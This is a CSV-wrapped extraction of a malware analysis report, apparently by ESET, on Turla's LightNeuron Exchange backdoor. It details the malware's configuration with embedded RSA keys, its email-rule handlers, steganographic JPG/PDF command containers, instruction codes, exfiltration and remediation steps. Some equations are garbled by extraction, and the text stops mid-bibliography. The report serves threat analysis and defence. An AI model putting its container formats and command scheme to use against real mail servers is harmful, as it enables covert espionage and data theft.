url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
Figure 11 summarizes the behavior of the LightNeuron Transport Agent. A detailed explanation
of the behavior of the companion DLL is available in the
Backdoor section
.,Turla LightNeuron
One email away from remote code execution14
Internal Email
Microsoft Exchange
Transport
Agent /one.pnum_lnumLightNeuron
Transport Agent
Log date
and Sender
Call the companion DLL
to process the email Transport
Agent n
Block the email
Execute
a commandModify the emailDo nothingExternal Email
Figure 11
// LightNeuron Transport Agent
4.3
Companion Dynamic Link Library
This second component implements most of the malicious functions that are needed
by the Transport Agent.
Identification
The companion DLL is a 64-bit Windows DLL developed in C. Our analysis is based on the sample
with SHA-1
76EE1802A6C920CBEB3A1053A4EC03C71B7E46F8
, apparently compiled on 02/09/2016.
This DLL exports three functions:
•
FL
(aka ForLoading): return 777
•
BLE
(aka BinaryLogEx): Log input data in a log file
•
SV
(aka SimpleValidate): Process an email
The exports’ full names were present in the oldest versions of the DLL, while in the most recent one,
they were shortened.
Initialization
When the Transport Agent loads the DLL, the DLL’s main function performs various initialization tasks.
First, it decrypts, using an XOR operation; most of the strings with the hardcoded key
0xA9
. Figure 12 shows
some interesting strings once decrypted.,Turla LightNeuron
One email away from remote code execution15
Figure 12
// Some decrypted strings
Then, it decrypts the configuration file stored in
%tmp%\winmail.dat
. Microsoft Outlook uses the same
filename when people send messages from an incorrectly configured mail client
[19]. We believe they choose
this filename to hide their configuration file in plain sight as a Microsoft Exchange administrator might
be accustomed to see many legitimate files named
winmail.dat
.
The configuration is encrypted with AES-256, with the first 32 bytes of the file being the RSA-encrypted
AES key. The 1024-bit RSA private key is hardcoded in the binary and it uses the mode PKCS1-v1_5
for encryption.
Figure 13 is an example of a decrypted configuration. Please note that we have redacted
some confidential information.,Turla LightNeuron
One email away from remote code execution16
<Parameters>
CONFIG_FILE_NAME:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmocf.xml
LOG_LEVEL:17
DEBUG_LOG_FILE_NAME
:c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmodl.
dat
CRYPT_KEY: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRH
TkFEQ0JpUUtCZ1FDOG5zc2g2UDJpa29YMnpBOFg3dUpNcmxRWApkM21Pc3VvcWRpa1pzQ1l3TlJCNXc5RVl
jeHRQYVdubEc4L2hCeC9IMG05cnZyelFVamxCa3dieDY5L2tSclhVCmZ5MkE3RGk2NTZldlExMHZPVHlBcH
RualMvRWtBKzFUUGRPSTdkZWcrakNpaDFMNk5TNUJFTyszTTN0aGZrVzcKZVU2ZUdkcVZyeWdiOWV6amxRS
URBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
DECRYPT_KEY: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDWFFJQkFBS0JnUURRTWdoRS
9sUlBpbGNNTXFqb1RSMDBJcU0wWkovalFuT2kwZzFTRXJ1dytaQ0tqUit0CmRZSHo1bUVNTXJmbS9uYnZkV
2hRQUxubERpSlNwOHRpa3VHdHdJajFrV09aQ0ppangvazhHWWdoNHZkZmtCSkcKbmlnQnJTMTliSktqMzh0
eElGVWI2NGQwK0hISlczdld1VVJFYUhwZjVFemdmQmdIZ1ZIN2NzaVE1UUlEQVFBQgpBb0dCQUlLMkJzOGF
SbUN4NERqK1RXR2JtS3cwMnZaMy9wSTJGRmV6UFQyOEdTN2hZTWc4RmhsWFgwRjc4STR5CkFaZjdSenpNSD
dPcTRRdFlObUJpaktUVXh1Nm5rYk5MajQxVWhYQks4YUl1S1oxa2lKUG5rY3RVUERWWjN5WmkKS1lKZ3lje
DI0SEozbXF3T05mZTczVElKcEsybDZFRkVDUDJkaTg5aHNZTFhsa2s1QWtFQTcwRGxlMDROMVBIeAozUzBj
WkhFQm9ZNnhyNElvUGJSQmZ2Wkd0NHEyZWs5ZjVldG1idjVvck54WnE4QUpzRkJsOWhBZFIxUE8rdUk5Ckl
0WnVGRzhvM3dKQkFON0VuZWpNQ05Td3FEdlhvSWxBMElFVkd5RlNIcHp1TDFBWW9FSFVhNXZpOFR0VC9KYV
kKN1pSSFNwNUxZeExLZkh6MGovWExBVFo5a2oxVDNkaWpDcnNDUUdlMk1RUC9kTjEvTjhJUndRSUZQcGpDM
jJGaQpRWUZsOXhKTFBhSm9mZXVOSnR2cTdBOW5Od2JmeWZzNmxyaVlVV3FWMTZ0SXVDdG5FT3RlR24rL0kr
OENRQnlsCjFGalh4RnIxek96Rk1oUDBqZHZMeHcxbDdpSG9UNVZSVldxaDBxVGRib0Jlc0tEOVViQTc2dEN
vaVRrbGFSVDQKcm5yQmZJcHhZNWtYYS9Rc0kza0NRUUMzeS9wVUdRK0J1MDhJczBmcTBSQmNmaG5zYXREen
djWjRZS0cwc0NXVgpxeXNjdTZBd3hvaGdjZEN2UGJiNDJYcnZIamFmbTZYYk05aXFnU0lqc0JuRgotLS0tL
UVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
LOG_OUTPUT
:c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\
MIN_SIZE_TO_ZIP:20000
ZIP_FILE_NAME:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\tmpE4BC
CONFIG_UPDATE_INTERVAL:1800
DEBUG_LOG_CRYPT:0
STAT_INTERVAL:5
STAT_PATH:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\tmpD48BC
SEND_FROM:[redacted]noreply@[redacted]
COMMAND_REPLY_SUBJECT:
Email_confirmation
COMMAND_REPLY_ATTACH_NAME: Letter; [redacted]; prnt01; Note; Instruction; List; Scanned;
Untitled; report; filename; ATT00001; ticket; Form; Attachment; Information
</Parameters>
Figure 13
// Partially redacted, decrypted configuration example
The configuration does not necessarily specify all the possible parameters. Some parameters,
such as CRYPT_KEY, have their default values hardcoded in the DLL, which could be used in case none
is specified in the
winmail.dat
file.
The different configuration parameters handled by the sample we analyzed are:
• COMMAND_REPLY_ATTACH_NAME
• COMMAND_REPLY_SUBJECT
• CONFIG_FILE_NAME
• CONFIG_UPDATE_INTERVAL
• CRYPT_KEY
• DEBUG_LOG_FILE_NAME
• DECRYPT_KEY
• LIMITS_MAILS_PER_SECOND
• LIMITS_MAILS_PER_SECOND_REFRESH_INTERVAL
• LIMITS_MEMORY_LOAD
• LIMITS_MEMORY_LOAD_REFRESH_INTERVAL
• LOG_LEVEL
• LOG_OUTPUT,Turla LightNeuron
One email away from remote code execution17
• MIN_SIZE_TO_ZIP
• POSTFIX_INCOMING_PATH
• SEND_AT_NIGHT
• SEND_FILE
• SEND_FROM
• SEND_NEW_MAIL_LOCAL_RECIPIENT
• SEND_NEW_MAIL_LOGIN
• SEND_NEW_MAIL_MODE
• SEND_NEW_MAIL_PASS
• SEND_NEW_MAIL_PORT
• SEND_NEW_MAIL_SERVER
• SEND_TIME
• SEND_TO
• STAT_INTERVAL
•
STAT_PATH
• TMP_ID_PATH
• USE_TEMPLATE
• ZIP_FILE_NAME
While most of the parameter names are self-explanatory, an interesting one is CONFIG_FILE_NAME.
This second configuration file contains the rules used to process the emails. We detail this behavior
in the next section.
Rules and handlers
In our example, the rules are defined in
c:\Windows\ServiceProfiles\NetworkService\appdata\
Local\Temp\msmocf.xml
. This file is encrypted in a similar way as
winmail.dat
and the RSA private
key is defined in the configuration parameter DECRYPT_KEY.
Once decrypted, this is an XML file describing rules, as shown in Figure 14. It contains several class nodes,
each one corresponding to a different function (aka handler) implemented in the DLL. Each class node
contains a set of rules describing conditions using the logical operators AND and OR. In addition, each
conditional node has three parameters:
• The field to which the condition applies
• The condition:
cnt
for contains and
!cnt
for does not contain
• The value that is compared to the field value
Finally, at the end of the file is the mapping of the class names with the name of the functions in the DLL.,Turla LightNeuron
One email away from remote code execution18
<class name=""zip"" metric=""30"" id=""1"" dllName=""ZipMe"" type=""dll"" include=""1"">
<rule metric=""10"" id=""1"" include=""1"">
<and>
<or>
<To condition=""cnt"" value=""email1@[redacted]"" />
<From condition=""cnt"" value=""email1@[redacted]"" />
<To condition=""cnt"" value=""email2@[redacted]"" />
<From condition=""cnt"" value=""email2@[redacted]"" />
[...]
</or>
<and>
<To condition=""!cnt"" value=""email3@[redacted]"" />
<From condition=""!cnt"" value=""email3@[redacted]"" />
[...]
</and>
</and>
</rule>
</class>
<class name=""command"" metric=""40"" id=""1"" dllName=""ZipMe"" type=""dll"" include=""1"">
<rule metric=""10"" id=""1"" include=""1"">
<attachment_Content-Type condition=""cnt"" value=""image/jpeg"" />
</rule>
</class>
log:logHandler
zip:zipHandler
changeSubject:changeSubjectHandler
changeBody:changeBodyHandler
create:createHandler
command:commandHandler
block:blockHandler
replace:replaceHandler
stat:statHandler
Figure 14
// Redacted example of a rule file
These rules are applied to every email processed by the DLL. Thus, the behavioral characteristics
of LightNeuron reside in this configuration file.
This configuration is highly flexible, allowing it to perform different actions depending on various fields
of the email. For example, it is possible to collect all the emails sent by one particular email address.
Moreover, the operators customize the rules for each victim. In the sample we analyzed, all the email
addresses contained in the rules belonged to the targeted organization. In one case, they were monitoring
around thirty different email addresses, which probably were the people about whom they were the most
interested in collecting information.
There are eleven different handlers implemented in the DLL and described in Table 1.
Table 1
Description of the handlers implemented in the DLL
Handler nameDescription
block
Block the email
changeBody
Change the body of the email
changeTo
Change the recipient of the email
changeSubject
Change the subject of the email
command
Parse the JPG/PDF attachment, decrypt and execute the commands. This is described in
detail in the
Backdoor section
create
Create a new email
log
Log email attachment in LOG_OUTPUT,Turla LightNeuron
One email away from remote code execution19
Handler nameDescription
replace
Replace the attachment
spam
Re-create and re-send the email from the exchange server to bypass the spam filter
stat
Log From, Date, To, Subject in STAT_PATH in CSV format
zip
Encrypt the email with RSA and store it in the path specified by ZIP_FILE_NAME.
All the handlers are implemented in the same way. In the arguments, there is the email in the form
of a linked-list with the different fields parsed (From, To, body, etc.). The handler can modify this linked-list
and will return a code corresponding to the action it performed, as listed in Table 2.
Table 2
Handler return codes and their descriptions
Return ValueDescription
0No modification
1Email modified
2Block the email
3Error
4Contains .NET assembly
Then, the Transport Agent interprets this return code to know if it should modify the email, block
it or execute .NET assembly code.
Figure 15 is the handler function for zip. Interestingly, it will dump, encrypt the email and store it on disk
but does not compress it. We believe these files are sent back to the attackers using a backdoor command.
Figure 15
// Decompilation output of the zip handler function
Some handlers, such as
changeSubject
, were not used in the rules we analyzed. However, by creating a new
set of rules, we were able to trigger this handler. The modification is easily noticed, as you can see in Figure 16.
Other handlers, such as
changeBody
or
changeTo
, might be used to hide some information or to redirect emails.,Turla LightNeuron
One email away from remote code execution20
Figure 16
// Original email (on the left) and email after the call to changeSubject (on the right)
Backdoor
The command handler is actually the implementation of a backdoor controlled by email.
It has the following properties:
• Depending on the rules, the commands are hidden in a PDF or a JPG attachment.
• It uses steganography to hide data in PDF documents or JPG pictures.
• The email is blocked so it will not be delivered to the final recipient.
Although this may sound very similar to the Turla Outlook backdoor controlled by PDF attachments
that we analyzed in 2018 [16], the format of the attachment is quite different. Thus, we believe a different
programmer or team developed it.
As shown in the configuration example, the rule to execute the command handler applies to every
attachment of type
image/jpeg
going through the Exchange server. It is not very efficient, as most of the
images do not contain commands. As an example, for one victim, the command handler processed around
7000 pictures while only 178 actually contained commands for the backdoor.
Every time the handler is called, it will first check whether the attachment is a PDF document or a JPG image,
as shown in Figure 17.
Figure 17
// Attachment type check (HexRays output),Turla LightNeuron
One email away from remote code execution21
PDF
In the case of a PDF document, the routine first checks for a signature by performing XOR operations
with the data from offset 0x0B to offset 0x10. One way to satisfy this signature condition is by setting
all the values from offset 0x0B to 0x10 to 0x00.
If the previous signature is satisfied, the routine reads the offset of the blob of data containing the command,
which we call the container, from offset 0x11. It also reads the size of the container from offset 0x15. Finally,
it copies the container data. Figure 18 shows these operations.
Figure 18
// Extraction of the container data from the PDF (HexRays output)
A visualization in a hexadecimal editor of the different fields is shown Figure 19.
Figure 19
// Representation in hexadecimal of a PDF containing a container
This PDF, which was modified to embed a command, is still valid as you can see in Figure 20.
Figure 20
// Modified PDF document with embeded commands for LightNeuron. Snake is another name for Turla.,Turla LightNeuron
One email away from remote code execution22
JPG
In case of a JPG image, it first computes a signature using 16 bytes from the first quantization table.
The quantization table is a part of the JPG format and contains data used during the compression of the picture.
It performs several XOR operations on these 16 bytes and compares the result against a hardcoded
signature, as shown in Figure 21.
Figure 21
// Validation of the JPG signature (HexRays output)
We can view these multiple XOR (
) operations on the input, followed by a comparison, as a set
of mathematical equations:
input
/zero.pnum_lnum
input
/four.pnum_lnum = /two.pnum_lnum/five.pnum_lnum/zero.pnum_lnum
input
/one.pnum_lnum
input
/five.pnum_lnum = /one.pnum_lnum/six.pnum_lnum
input
/two.pnum_lnum
input
/six.pnum_lnum = /eight.pnum_lnum/two.pnum_lnum
input
/three.pnum_lnum
input
/seven.pnum_lnum = /one.pnum_lnum/four.pnum_lnum/five.pnum_lnum
input
/zero.pnum_lnum
input
/one.pnum_lnum/zero.pnum_lnum = /four.pnum_lnum/zero.pnum_lnum
input
/one.pnum_lnum
input
/one.pnum_lnum/one.pnum_lnum = /two.pnum_lnum/one.pnum_lnum/nine.pnum_lnum
input
/two.pnum_lnum
input
/one.pnum_lnum/two.pnum_lnum = /two.pnum_lnum/one.pnum_lnum/three.pnum_lnum
input
/three.pnum_lnum
input
/one.pnum_lnum/three.pnum_lnum = /one.pnum_lnum/seven.pnum_lnum/six.pnum_lnum
Once we have the set of equations, we can easily solve it manually or use a SMT (Satisfiability Modulo
Theories) solver such as Microsoft Z3
[20] to find out whether a solution exists and, if so, to find one possible
solution. It turns out this set of equations is solvable and we use the solution to create a JPG image
that can pass the check.
If the previous equation is satisfied, it gets the length of the container from offset 0x0F of the quantization table.
Finally, it extracts the container from the last Start of Scan section, another standard field of the JPG format.
By modifying the quantization table, the resulting picture is also affected. However, the image is still valid,
as shown in Figure 22.,Turla LightNeuron
One email away from remote code execution23
Figure 22
// Modified JPG picture with embedded commands for LightNeuron
Container and command execution
Regardless of the attachment type delivering it, the container format is strictly identical. The first four bytes
are the size of the container and the following bytes are encrypted with AES-256 with a key hardcoded
in the binary. Figure 23 shows an example of an encrypted container.
Figure 23
// Hexadecimal dump of an encrypted container
Once decrypted, we see the different fields used to store information about the commands to be executed.
In Figure 24, we can see some of the most important fields:
• At offset 0x08, the email address to which the result of the command is sent.
• At offset 0x1D, the instruction code. It corresponds to a function in the DLL.
• At offset 0x25, the first argument. It will be passed to the function represented by the instruction code.
Figure 24
// Hexadecimal dump of a decrypted container
If an email containing this particular container, embedded in a JPG or in a PDF, is sent to a server compromised
by LightNeuron, a calculator will be executed on the Microsoft Exchange server.
In addition to the instruction code 0x04, which runs the executable given by the first argument,
there are eight other instruction codes having up to three arguments. Table 2 describes the nine different
backdoor instructions.,Turla LightNeuron
One email away from remote code execution24
Table 2
List of instruction codes
Instruction
CodeDescription Arg 1Arg 2Arg 3
0x01Write a file.
Execute it if it is an executable. Exe pathN/AFile data
0x02Delete a file File pathN/AN/A
0x03Exfiltrate a file File pathSet to “1” to
delete the fileN/A
0x04Execute a process (CreateProcess) Command lineN/AN/A
0x05Execute a command line (cmd.exe /c) Command line N/AN/A
0x06Return 0 N/AN/AN/A
0x07Disable backdoor for N minutes. MinutesN/AN/A
0x09Exfiltrate a file (duplicate function of
0x03) File PathSet to “1” to
delete the fileN/A
0x65No-op N/AN/AN/A
The detailed structure, in C-like syntax, of the container is available Figure 25.
struct
encrypted_container {
int size; //clear text
container[];
//encrypted with AES-256
}
struct
container { //Can contain multiple commands
int CmdId; //Unique ID to identify the container
int rcptl; //Recipient address length
char rcpt[rcptl]; //Recipient address (address to which the output data will be sent)
command[];
//list of commands
}
struct
command {
int InstId; //Unique ID to identify this command
int InstrCode; //The instruction that will be executed
int fpl; //First parameter length
char fp[fpl]; //First parameter
int spl; //Second parameter length
char sp[spl]; //Second parameter
int bpl; //Third parameter length
char bp[bpl]; //Third parameter
}
Figure 25
// Structure of the command container (C-like syntax)
When processing a container, the backdoor writes the
CmdId
value to a log file, located at the path
c:\Win-
dows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Windows\thumbcache_32.
db
. The backdoor checks it just before processing a new container, to check whether this container
has already been processed. This is an anti-replay mechanism, probably to avoid duplicate execution
if the mail server somehow receives the same email multiple times.
Finally, the command output is encrypted with AES and a PDF document or a JPG image is built using
a format similar to that described earlier. Interestingly, it reuses the incoming PDF or JPG and replaces
the command container with a container holding the output data. An email is then created using data
,Turla LightNeuron
One email away from remote code execution25
from the configuration and the destination address provided in the incoming container. For instance,
it uses the following fields from
winmail.dat
:
SEND_FROM:
[redacted]noreply@[redacted]
COMMAND_REPLY_SUBJECT:
Email_confirmation
COMMAND_REPLY_ATTACH_NAME:
Letter; [redacted]; prnt01; Note; Instruction; List; Scanned;
Untitled; report; filename; ATT00001; ticket; Form; Attachment; Information
To send the email, it simply drops it in the folder
<ExchangeInstallFolder>\TransportRoles\PickUp\
and the filename starts with
msg
followed by the result of the
GetTickCount
function. According to the
Microsoft documentation [21]:
The Pickup and replay directories are used by the Transport service on Mailbox servers and Edge
Transport servers to insert message files directly into the transport pipeline
Correctly formatted
email message files that you copy to the Pickup or Replay directories are submitted for delivery
Moreover, Exchange does not perform any security check on the email sent via this folder
[22]:
Any security checks configured on a Receive connector, such as anti-spam, anti-malware, sender
filtering, or recipient filtering actions, aren't performed on messages submitted through the Pickup
directory or the Replay directory
Thus, security solutions will not see the data exfiltrated through LightNeuron, which makes this malware
very stealthy.
An example of an email containing the result of LightNeuron executing a command is shown in Figure 26.
The recipient is
reply@example com
, as specified in the incoming command container. The sender is
noreply@
example com
, which is the address we choose to use to replace the redacted one specified in the original
configuration. The subject header and the attachment name were selected from the lists in the configura -
tion and the incoming PDF was re-used to transport output data.
Figure 26
// Example of an email generated by LightNeuron to send command output,Turla LightNeuron
One email away from remote code execution26
Miscellaneous
Logging
The companion DLL uses logging extensively. The log level can be customized in the configuration file,
allowing logging only relevant information when the malware is implanted on a victim machine.
The log files are encrypted with AES-256. Each log entry contained in the log files is encrypted separately
and the thirty-two first bytes of each log file contain the key.
Regardless of the log’s purpose, each log entry has the same format, as described in Figure 27 in C-like syntax.
struct
log_entry {
DWORD total_size;
QWORD unknown1; //AES encryption begins here
DWORD log_code;
DWORD hex_value;
DWORD unknown2;
DWORD data_size;
char data[data_size];
}
Figure 27
// Log entry structure in C-like syntax
The most important fields are:
• The log code field: each different code corresponds to a different logging event. For example, the log code
0x3C28 corresponds to the execution of a handler.
• The hex value field: Used when the data are numerical. For example, it can contain the Instruction
Code executed by the backdoor.
• The data field: Used to store text data. For example, it can contain the subject of the email.
The log file names vary across the different samples but for the sample we analyzed, we identified
the following six log files:
Table 3
Description of the log files
ComponentPath Description
Transport AgentC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\814ad43-58ab-2cd3-3e68-b82a8f402fd0 Log the sender and the date of every
email processed by the Exchange server
Transport AgentC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\42cf8a1-6e20-8c24-d35f-82c46d8b70ba Error log
Companion DLLC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\36b1f4a-82b9-eb06-7c1e-90b4b2d5c27d Log the date at each execution of the
DLL main
Companion DLLC:\Windows\ServiceProfiles\NetworkService\AppData\
Roaming\Microsoft\thumbcache_idx.db Log backdoor actions
Companion DLLC:\Windows\ServiceProfiles\NetworkService\appdata\
Local\Temp\msmodl.dat Debug log
Companion DLLC:\Windows\ServiceProfiles\NetworkService\AppData\
Roaming\Microsoft\Windows\thumbcache_32.db Log the command id. Used to protect
against replay attacks.,Turla LightNeuron
One email away from remote code execution27
Automatic exfiltration
If the configuration parameters
SEND_TIME
and
SEND_AT_NIGHT
are set, a thread launched by the DLL main
function will loop indefinitely. As shown in Figure 28, it first waits
SEND_TIME
seconds and then checks if the
exfiltration should only occur during the night or during working hours. In the latter case, it checks whether
the hour is between 17:00 and 09:00 and if it is true, it re-enters the sleep loop without exfiltrating any files.
Figure 28
// Exfiltration loop with night check (HexRays output)
The exfiltration function, shown in Figure 29, loops over the files that match the
SEND_FILE
specification.
It is possible to include wildcards in the filename specification to match several different files. Then, for each
file, it will send an email containing the file in either a JPG or a PDF attachment. The
Backdoor section
details
the sending of the emails.
Figure 29
// Exfiltration loop (HexRays output)
Even though we did not see Turla make use of it in the wild, we believe this functionality might be used
to exfiltrate automatically the emails archived by the
zip
handler, as this handler does not implement
any exfiltration mechanism. ,Turla LightNeuron
One email away from remote code execution28
4.4 Evolution
Even without the earliest versions of LightNeuron, we noticed some development effort between
the different versions we have seen:
• There was an effort to obfuscate function names in the .NET Transport Agent.
• Some Indicators of Compromise are different in each sample:
• Mutex names,
• Log file names,
• AES key used by the backdoor.
• The oldest versions only support JPG attachments for the C&C protocol, while the latest versions
also support PDF documents.
4.5
Linux variant
In a previous section, we explained that most of the strings used by LightNeuron are encrypted. It turns
out that some decrypted strings contain strings that make sense only in a Unix environment.
Figure 30 shows some of these strings that refer to Unix. For example,
sendmail
is a common executable
used to send an email on Linux. Thus, piping email content with
cat
to
sendmail
is actually a common way
to send an email in a Linux environment. Further, Postfix is an alternative mail server to
sendmail
.
Figure 30
// Linux strings in the Windows DLL
These Unix artefacts in the Windows malware could be explained by the possible sharing of code between
Windows and Unix implementations.
Hence, the presence of these strings suggests LightNeuron exists for Linux. That would not be surprising,
given that many organizations have Linux mail servers.
5.
REMEDIATION
5.1 Cleaning
The cleaning of LightNeuron is not an easy task.
Simply removing the two malicious files will break
Microsoft Exchange
, preventing everybody in the organization from sending and receiving emails.
Note to other AV vendors: before adding a detection for the Transport Agent files, be aware that doing
so without a proper cleaning routine will render your infected customer’s exchange servers inoperable,
so proceed with caution.,Turla LightNeuron
One email away from remote code execution29
Before actually removing the files, the malicious Transport Agent should be disabled.
First, open
<ExchangeInstallFolder>\TransportRoles\Agents\agents.config
and check every DLL.
All of the genuine Transport Agents should be signed either by Microsoft a trusted software vendor. The
agents.config
file should be similar to Figure 31.
<?xml version=""1.0"" encoding=""utf-8""?>
<configuration>
<mexRuntime>
<monitoring>
<agentExecution
timeLimitInMilliseconds=""90000"" />
</monitoring>
<agentList>
[...]
<agent
name=""Security Interop Agent""
baseType=
""Microsoft.Exchange.Data.Transport.Smtp.SmtpReceiveAgent""
classFactory=""
Microsoft.Exchange.Security.Interop.
SecurityInteropAgentFactory""
assemblyPath=""
c:\program files\microsoft\Exchange Server\v15\bin\
Microsoft.Exchange.Security.Interop.dll""
enabled=
""true""
IsCritical=
""true"" />
<agent
name=""Content Filter Agent""
baseType=
""Microsoft.Exchange.Data.Transport.Routing.RoutingAgent""
classFactory=
""Microsoft.Exchange.Security.Interop.
ContentFilterAgentFactory""
assemblyPath=
""c:\program files\microsoft\Exchange Server\v15\bin\
Microsoft.Exchange.Security.Interop.dll""
enabled=
""true""
IsCritical=
""true""
/>
</agentList>
<settings />
</mexRuntime>
</configuration>
Figure 31
//
agents.config
example
In that example, the malicious DLL is
Microsoft.Exchange.Security.Interop.dll
and two related
Transport Agents are registered:
•
Security Interop Agent
(called <name1> in the following explanations)
•
Content Filter Agent
(called <name2> in the following explanations)
Then, on the Exchange server, execute the following PowerShell commands with admin rights:
Disable-TransportAgent -Identity <name1>
Disable-TransportAgent -Identity <name2>
Uninstall-TransportAgent -Identity <name1>
Uninstall-TransportAgent -Identity <name2>
The malicious Transport Agents are now disabled. After that, it is possible to remove the two malicious files
without breaking Microsoft Exchange.
If you do not plan to re-install the mail server, an important last step is to modify the passwords
of all accounts that have administrative rights on the compromised server. Otherwise, attackers could access
the server again to compromise it again.,Turla LightNeuron
One email away from remote code execution30
5.2 Mitigations
Given that attackers have gained administrative privileges on the Exchange server, there are no bulletproof
mitigations against this threat. However, these few recommendations can help to detect the compromise
and to make the attacker’s work harder.
• Use dedicated accounts for the administration of Exchange servers with strong, unique passwords
and, if possible, 2FA.
• Monitor closely the usage of these accounts.
• Restrict PowerShell execution.
• Regularly check that all the installed Transport Agents are signed by a trusted provider.
6.
CONCLUSION
In addition to their Turla Outlook backdoor
[16], LightNeuron is another example that Turla operators
have a large set of sophisticated, custom malware at their disposal.
To our knowledge, this is the first time a malicious actor has leveraged a Microsoft Exchange Transport
Agent to enable persistence on a mail server. This technique is very interesting as it allows them to receive
commands and exfiltrate data without any filtering.
LightNeuron is a very powerful piece of malware. It can spy on all the emails of the compromised organization
but also execute commands, for example, to control other machines on the local network. This makes
it a main hub in the breached network for Turla operators.
We will continue to monitor Turla developments to help defenders to protect their networks.
Indicators of Compromise can also be found on
GitHub
For any inquiries, or to make sample submissions related
to the subject, contact us at: threatintel@eset com
,Turla LightNeuron
One email away from remote code execution31
7.
BIBLIOGRAPHY
1
B. KNOWLTON, “Military Computer Attack Confirmed,” New York Times, 25 08 2010. [Online]. Available:
https://www nytimes com/2010/08/26/technology/26cyber html?_r=1&ref=technology
. [Accessed 09 04 2018].
2
MELANI, “ Technical Report about the Malware used in the Cyberespionage against RUAG,” 23 05 2016.
[Online]. Available:
https://www melani admin ch/melani/en/home/dokumentation/reports/technical-reports/
technical-report_apt_case_ruag html
.
3
M. Untersinger, “Quelle est la bonne équation pour pacifier le cyberespace ?,” Le Monde, 29 01 2019. [Online].
Available:
https://www lemonde fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-
le-difficile-apaisement-du-cyberespace_5416003_4408996 html
.
4
A. Cherepanov, “GREYENERGY: A successor to BlackEnergy,” ESET, 2018.
5
A. Cherepanov, “TeleBots are back: Supply-chain attacks against Ukraine,” ESET, 30 06 2017. [Online].
Available: https://www welivesecurity com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/
.
6
ESET Research, “Turla Mosquito: A shift towards more generic tools,” 22 05 2018. [Online].
Available:
https://www welivesecurity com/2018/05/22/turla-mosquito-shift-towards-generic-tools/
.
7
Kaspersky GReAT, “Shedding Skin - Turla’s Fresh Faces,” 04 10 2018. [Online].
Available:
https://securelist com/shedding-skin-turlas-fresh-faces/88069/
.
8
ESET Research, “Carbon Paper: Peering into Turla’s second stage backdoor,” ESET, 30 03 2017. [Online].
Available:
https://www welivesecurity com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
.
9
ESET Research, “Gazing at Gazer - Turla’s new second stage backdoor,” ESET, 08 2017. [Online].
Available:
https://www welivesecurity com/wp-content/uploads/2017/08/eset-gazer pdf
.
10
D. Huss, “Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G20-themed
attack,” 17 08 2017. [Online]. Available:
https://www proofpoint com/us/threat-insight/post/
turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack
.
11
J.-I. Boutin, “Turla’s watering hole campaign: An updated Firefox extension abusing
Instagram,” 06 06 2017. [Online]. Available:
https://www welivesecurity com/2017/06/06/
turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/
.
12
ESET Research, “Diplomats in Eastern Europe bitten by a Turla mosquito,” ESET, 01 2018. [Online].
Available: https://www welivesecurity com/wp-content/uploads/2018/01/ESET_Turla_Mosquito pdf
.
13
National Cyber Security Centre, “Turla group using Neuron and Nautilus tools alongside Snake malware,”
23 11 2017. [Online]. Available:
https://www ncsc gov uk/content/files/protected_files/article_files/Turla%20group%20
using%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf
.
14
S. Tanase, “Satellite Turla: APT Command and Control in the Sky,” 09 09 2015. [Online].
Available: https://securelist com/satellite-turla-apt-command-and-control-in-the-sky/72081/
.
15
